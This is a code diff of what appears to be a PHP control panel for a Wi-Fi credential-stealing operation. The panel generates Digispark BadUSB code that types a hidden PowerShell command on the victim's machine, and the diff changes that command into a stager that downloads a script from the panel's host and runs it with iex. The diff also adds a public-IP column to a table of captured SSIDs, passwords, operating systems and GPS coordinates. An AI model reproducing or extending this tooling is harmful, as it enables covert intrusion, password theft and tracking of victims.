@@ -203,8 +203,8 @@ function parse_capture_line($line): ?array {
     $longitude   = trim($fields[9] ?? '');
     $pktSummary  = trim($fields[10] ?? '');
 
-    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
-    if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
+    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password', 'myssid', 'test'];
+    if ($ssid === '' || in_array(strtolower($ssid), $badSsids, true) || in_array(strtolower($pass), ['pass', 'password', 'mypass'], true)) {
         return null;
     }
     if ($pass === '') $pass = '(Not Found)';
@@ -1013,7 +1013,7 @@ $uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));
 
       <div style="margin-bottom:18px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
-          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">1. Digispark (Arduino IDE C++ Code)</span>
+          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">1. Digispark (Arduino IDE C++ Code — Fits Digispark RAM)</span>
           <button type="button" onclick="copyCode('digiCode')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy Arduino Code</button>
         </div>
         <pre id="digiCode" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:14px;color:#cbd5e1;overflow-x:auto;white-space:pre-wrap;">#include "DigiKeyboard.h"
@@ -1028,8 +1028,8 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(600);
 
-  // Execute clean encoded payload
-  DigiKeyboard.print("powershell -w hidden -ep bypass -nop -enc <?php echo $b64Enc; ?>");
+  // Stager runs payload silently in background and immediately closes
+  DigiKeyboard.print(F("powershell -w hidden -nop -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;irm <?php echo $proto . '://' . $host; ?>/s.php?t=<?php echo urlencode($currentUser); ?>|iex\""));
   DigiKeyboard.delay(400);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
@@ -1098,6 +1098,7 @@ void loop() {
             <th>Password</th>
             <th>Strength</th>
             <th>LAN IP</th>
+            <th>Public IP</th>
             <th>Target OS</th>
             <th>Coordinates</th>
           </tr>
@@ -1121,6 +1122,7 @@ void loop() {
               <?php endif; ?>
             </td>
             <td><span style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#94a3b8"><?php echo h($cap['ip_main']); ?></span></td>
+            <td><span style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#38bdf8"><?php echo h($cap['public_ip'] ?? 'unknown'); ?></span></td>
             <td><?php echo h($cap['os']); ?></td>
             <td>
               <?php if ($cap['latitude'] !== 'N/A' && $cap['longitude'] !== 'N/A'): ?>
